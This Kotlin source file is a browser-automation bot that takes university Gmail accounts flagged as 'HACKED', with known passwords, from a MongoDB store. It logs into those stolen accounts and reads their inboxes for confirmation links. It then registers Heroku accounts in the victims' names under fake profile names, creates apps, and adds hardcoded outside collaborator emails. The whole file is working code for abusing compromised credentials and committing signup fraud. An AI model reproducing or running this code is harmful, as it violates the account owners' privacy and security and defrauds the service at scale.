package net.scr0pt.thirdservice.heroku

import com.mongodb.client.MongoClients
import com.mongodb.client.MongoCollection
import com.mongodb.client.model.Updates
import net.scr0pt.bot.HerokuPageResponse
import net.scr0pt.bot.Page
import net.scr0pt.bot.PageManager
import net.scr0pt.bot.PageResponse
import net.scr0pt.crawl.school.random
import net.scr0pt.thirdservice.mlab.loginGoogle
import net.scr0pt.thirdservice.mongodb.MongoConnection
import net.scr0pt.utils.FakeProfile
import net.scr0pt.utils.tempmail.Gmail
import net.scr0pt.utils.tempmail.event.MailReceiveEvent
import net.scr0pt.utils.tempmail.models.Mail
import net.scr0pt.utils.webdriver.Browser
import net.scr0pt.utils.webdriver.DriverManager
import org.jsoup.nodes.Document

/**
 * Created by Long
 * Date: 10/18/2019
 * Time: 9:11 PM
 */

suspend fun main() {
    val mongoClient = MongoClients.create(MongoConnection.eduConnection)
    val accountDatabase = mongoClient.getDatabase("edu-school-account")
    val eduCollection = accountDatabase.getCollection("vimaru-email-info")

    val mongoClient2 =
            MongoClients.create(MongoConnection.megaConnection)
    val herokuDatabase = mongoClient2.getDatabase("heroku")
    val herokuCollection = herokuDatabase.getCollection("heroku-account")
    while (true) {
        eduCollection.random(org.bson.Document("login_status", "PASSWORD_CORRECT").append("email_status", "HACKED"))?.let {
            if (!it.containsKey("Allow less secure apps")) return

            val gmailUsername = it.getString("email")
            val gmailPassword = it.getString("new_pass") ?: it.getString("pass")
            val gmail_recover_email: String? = it.getString("recover_email")

            if (herokuCollection.countDocuments(org.bson.Document("email", gmailUsername)) > 0L) return

            val appName = randomAppname()
            val collaboratorEmailList = arrayListOf(
                    "brucealmighty5daeae612ce205583fda39d5@gmail.com",
                    "alphahoai@gmail.com"
            )
            val result = FakeProfile.getNewProfile()
            val first = result?.name?.first ?: "Bruce"
            val last = result?.name?.last ?: "Lee"
            println(gmailUsername)
            println(first)
            println(last)
            registerHeroku(
                    gmailUsername = gmailUsername,
                    gmailPassword = gmailPassword,
                    gmail_recover_email = gmail_recover_email,
                    email = gmailUsername,
                    appName = appName,
                    collaboratorEmailList = collaboratorEmailList,
                    password = "Bruce_${System.currentTimeMillis()}",
                    firstName = first,
                    lastName = last,
                    driver = Browser.firefox,
                    herokuCollection = herokuCollection
            )
        }
    }
}

suspend fun registerHeroku(
        email: String,
        password: String,
        firstName: String,
        lastName: String,
        appName: String,
        collaboratorEmailList: ArrayList<String>,
        driver: DriverManager,
        herokuCollection: MongoCollection<org.bson.Document>,
        gmailUsername: String,
        gmailPassword: String,
        gmail_recover_email: String?
) {
    loginGoogle(gmailUsername, gmailPassword, driver, onLoginSuccess = {
        PageManager(driver, "https://signup.heroku.com").apply {
            addPageList(arrayListOf<Page>(
                    HerokuRegisterPage(firstName, lastName, email) {
                        herokuCollection.insertOne(
                                org.bson.Document("email", email)
                                        .append("password", password).append("firstName", firstName).append("lastName", lastName)
                                        .append("verify", false)
                        )
                        println("HerokuRegisterPage success")
                    },
                    HerokuRegisterDoneWaitingCheckEmailPage(gmailUsername, gmailPassword, startTime) {
                        println("HerokuRegisterDone_WaitingCheckEmail_Page success")
                    },
                    GoogleGmailPage() {
                        println("GoogleGmailPage success")
                    },
                    HerokuSetYourPasswordPage(password = password) {
                        herokuCollection.updateOne(
                                org.bson.Document("email", email),
                                Updates.set("verify", true)
                        )
                        println("HerokuSetYourPasswordPage success")
                    },
                    HerokuWelcomePage {
                        println("HerokuWelcomePage success")
                    },
                    HerokuDashboardPage(action = HerokuDashboardPage.HerokuDashboardAction.CREATE_NEW_APP) {
                        println("HerokuDashboardPage success")
                    },
                    HerokuCreateNewAppPage(appName = appName) {
                        herokuCollection.updateOne(org.bson.Document("email", email), Updates.set("appName", appName))
                        println("HerokuCreateNewAppPage ${appName} success")
                    },
                    HerokuDeployPagePage {
                        println("HerokuDeployPagePage success")
                    },
                    HerokuAccessPage(collaboratorEmailList = collaboratorEmailList) {
                        println("HerokuAccessPage ${collaboratorEmailList.joinToString(", ")} success")
                    }
            ))
            run { pageResponse ->
                println(pageResponse)
                if (pageResponse is HerokuPageResponse.COLLABORATOR_ADDED) {
                    herokuCollection.updateOne(
                            org.bson.Document("email", email),
                            Updates.pushEach("collaborators", collaboratorEmailList)
                    )
                }

                Thread.sleep(60000)
                driver.close()
                Thread.sleep(180000)
            }
        }
    }, recoverEmail = gmail_recover_email)
}

class HerokuRegisterPage(
        val firstName: String,
        val lastName: String,
        val email: String,
        onPageFinish: (() -> Unit)? = null
) : Page(onPageFinish = onPageFinish) {
    override fun isEndPage() = false

    override fun _action(driver: DriverManager): PageResponse {
        println(this::class.java.simpleName + ": action")
        try {
            driver.executeScript(
                    """
                    function randInt(max, min){
                        return Math.floor(Math.random() * (+max - +min + 1)) + +min;
                    }
                    var signupForm = document.querySelector("form.signup-form");
                    signupForm.first_name.value = "${firstName}";
                    signupForm.last_name.value = "${lastName}";
                    signupForm.email.value = "${email}";
                    signupForm.role.value = signupForm.role[randInt(1, signupForm.role.length - 1)].value;
                    signupForm.self_declared_country.value = signupForm.self_declared_country[randInt(1, signupForm.role.length - 1)].value;
                    signupForm.main_programming_language.value = signupForm.main_programming_language[randInt(1, signupForm.role.length - 1)].value;
                    
                    document.querySelector('input[value="Create Free Account"]').click();
                    
        """.trimIndent()
            )
        } catch (e: Exception) {
        }

        return PageResponse.WAITING_FOR_RESULT()
    }

    override fun _detect(doc: Document, currentUrl: String, title: String): Boolean =
            title == "Heroku | Sign up" &&
                    currentUrl.startsWith("https://signup.heroku.com") &&
                    doc.selectFirst(".header-main h2")?.text() == "Sign up for free and experience Heroku today"
}

class HerokuRegisterDoneWaitingCheckEmailPage(
        val gmailUsername: String,
        val gmailPassword: String,
        val registerTime: Long,
        onPageFinish: (() -> Unit)? = null
) : Page(onPageFinish = onPageFinish) {
    override fun isEndPage() = false
    var gmail: Gmail? = null

    override fun _action(driver: DriverManager): PageResponse {
        if (gmail == null) {
            gmail =
                    Gmail(gmailUsername, gmailPassword).apply {
                        onEvent(MailReceiveEvent(
                                key = "ona_heroku_sender",
                                validator = { mail ->
                                    (mail.id ?: 0) > registerTime &&
                                            Mail.CompareType.EQUAL_IGNORECASE.compare(mail.from, "noreply@heroku.com") &&
                                            Mail.CompareType.EQUAL_IGNORECASE.compare(mail.subject, "Confirm your account on Heroku")
                                },
                                callback = { mails ->
                                    val mail =
                                            mails.firstOrNull { it.content?.contains("Thanks for signing up with Heroku! You must follow this link to activate your account:") == true }
                                    val acceptLink = mail?.contentDocumented?.selectFirst("a[href^='https://id.heroku.com/account/accept/']")?.attr("href")
                                    if (acceptLink != null) {
                                        this.logout()
                                        driver.get(acceptLink)
                                    }
                                },
                                once = false,
                                new = true,
                                fetchContent = true
                        )
                        )
                    }
        }
        return PageResponse.WAITING_FOR_RESULT()
    }

    override fun _detect(doc: Document, currentUrl: String, title: String): Boolean =
            currentUrl.startsWith("https://signup.heroku.com/account") &&
                    doc.selectFirst(".header-main h2") == null &&
                    doc.selectFirst(".account-page .account-content h2")?.text() == "Almost there …" &&
                    doc.selectFirst(".account-page .account-content h3")?.text()?.startsWith("Please check your email") == true
}

class HerokuSetYourPasswordPage(
        val password: String,
        onPageFinish: (() -> Unit)? = null
) : Page(onPageFinish = onPageFinish) {
    override fun isEndPage() = false

    override fun _action(driver: DriverManager): PageResponse {
        driver.sendKeysFirstEl(password, "input#user_password") ?: return PageResponse.NOT_FOUND_ELEMENT()
        driver.sendKeysFirstEl(password, "input#user_password_confirmation") ?: return PageResponse.NOT_FOUND_ELEMENT()
        driver.clickFirstEl("form.signup-form.confirmation-form .input-group input[type=\"submit\"]")
                ?: return PageResponse.NOT_FOUND_ELEMENT()
        return PageResponse.WAITING_FOR_RESULT()
    }

    override fun _detect(doc: Document, currentUrl: String, title: String): Boolean =
            currentUrl.startsWith("https://signup.heroku.com/confirm") &&
                    doc.selectFirst(".header-main h2") == null &&
                    doc.selectFirst(".account-page .account-content h2")?.text() == "Set your password" &&
                    doc.selectFirst(".account-page .account-content h3")?.text() == "Create your password and log in to your Heroku account."
}


class HerokuWelcomePage(
        onPageFinish: (() -> Unit)? = null
) : Page(onPageFinish = onPageFinish) {
    override fun isEndPage() = false

    override fun _action(driver: DriverManager): PageResponse {
        driver.clickFirstEl("form#final_login .center input[type=\"submit\"]")
                ?: return PageResponse.NOT_FOUND_ELEMENT()
        return PageResponse.WAITING_FOR_RESULT()
    }

    override fun _detect(doc: Document, currentUrl: String, title: String): Boolean =
            currentUrl.startsWith("https://signup.heroku.com/account/accept/ok") &&
                    doc.selectFirst(".header-main h2") == null &&
                    doc.selectFirst(".account-page .account-content h2")?.text() == "Welcome to Heroku" &&
                    doc.selectFirst(".account-page .account-content h3") == null &&
                    doc.selectFirst("form#final_login .center input[type=\"submit\"]")?.attr("value") == "Click here to proceed"
}


class HerokuCreateNewAppPage(
        val appName: String,
        onPageFinish: (() -> Unit)? = null
) : Page(onPageFinish = onPageFinish) {
    override fun isEndPage() = false

    override fun _action(driver: DriverManager): PageResponse {
        driver.sendKeysFirstEl(appName, "form.new-app-view .new-app-name input")
                ?: return PageResponse.NOT_FOUND_ELEMENT()
        driver.clickFirstEl("form.new-app-view button.create-app-button") ?: return PageResponse.NOT_FOUND_ELEMENT()
        return PageResponse.WAITING_FOR_RESULT()
    }

    override fun _detect(doc: Document, currentUrl: String, title: String): Boolean =
            currentUrl.startsWith("https://dashboard.heroku.com/new-app")
}

class HerokuDeployPagePage(
        onPageFinish: (() -> Unit)? = null
) : Page(onPageFinish = onPageFinish) {
    override fun isEndPage() = false

    override fun _action(driver: DriverManager): PageResponse {
        driver.get(driver.url.substringBefore("/deploy") + "/access")
        return PageResponse.WAITING_FOR_RESULT()
    }

    override fun _detect(doc: Document, currentUrl: String, title: String): Boolean =
            currentUrl.startsWith("https://dashboard.heroku.com/apps/") &&
                    currentUrl.contains("/deploy/heroku-git")
}


class HerokuAccessPage(
        collaboratorEmailList: ArrayList<String>,
        onPageFinish: (() -> Unit)? = null
) : Page(onPageFinish = onPageFinish) {
    data class AddingCollaboratorEmailStatus(val collaboratorEmail: String, var isAdded: Boolean = false)

    private val collaboratorEmailObjectList: List<AddingCollaboratorEmailStatus> = collaboratorEmailList.map { AddingCollaboratorEmailStatus(it) }

    override fun isEndPage() = false

    override fun watingResult(doc: Document, currentUrl: String, title: String): PageResponse? {

        doc.select(".collaborator-list tr.collaborator-item")?.forEach {
            val txt = it.text().trim()
            val email = txt.split(" ")[0]
//            val role = txt.split(" ")[1]

            collaboratorEmailObjectList.firstOrNull { collaboratorEmail -> collaboratorEmail.collaboratorEmail == email }?.let {
                it.isAdded = true
            }
        }

        if (collaboratorEmailObjectList.firstOrNull { !it.isAdded } == null) {
            return HerokuPageResponse.COLLABORATOR_ADDED()
        }
        return null
    }

    override fun _action(driver: DriverManager): PageResponse {

        collaboratorEmailObjectList.forEach {
            val collaboratorEmail = it.collaboratorEmail
            driver.clickFirstEl("button.hk-button--secondary", equals = "Add collaborator")
                    ?: return@_action PageResponse.NOT_FOUND_ELEMENT()
            driver.sendKeysFirstEl(collaboratorEmail, "input", filter = { el -> "user@domain.com".equals(el.getAttribute("placeholder"), ignoreCase = true) })
                    ?: return@_action PageResponse.NOT_FOUND_ELEMENT()
            driver.clickFirstEl("button.hk-button--primary", equals = "Save changes") ?: return@_action PageResponse.NOT_FOUND_ELEMENT()
            Thread.sleep(2000)
        }
        return PageResponse.WAITING_FOR_RESULT()
    }

    override fun _detect(doc: Document, currentUrl: String, title: String): Boolean =
            currentUrl.startsWith("https://dashboard.heroku.com/apps/") &&
                    currentUrl.contains("/access")
}


class GoogleGmailPage(
        onPageFinish: (() -> Unit)? = null
) : Page(onPageFinish = onPageFinish) {
    override fun isEndPage() = false

    override fun _action(driver: DriverManager): PageResponse {
        val link =
                driver.html.substringAfter("Thanks for signing up with Heroku! You must follow this link to activate your account: ")
                        ?.substringBefore("Have fun")?.trim()
        if (link.startsWith("https://id.heroku.com/account/accept/")) {
            driver.get(link)
        }
        return PageResponse.WAITING_FOR_RESULT()
    }

    override fun _detect(doc: Document, currentUrl: String, title: String): Boolean =
            currentUrl.startsWith("https://mail.google.com/mail/") &&
                    doc.html().contains("Thanks for signing up with Heroku! You must follow this link to activate your account") &&
                    doc.html().contains("https://id.heroku.com/account/accept/") &&
                    doc.html().contains("Have fun")
}
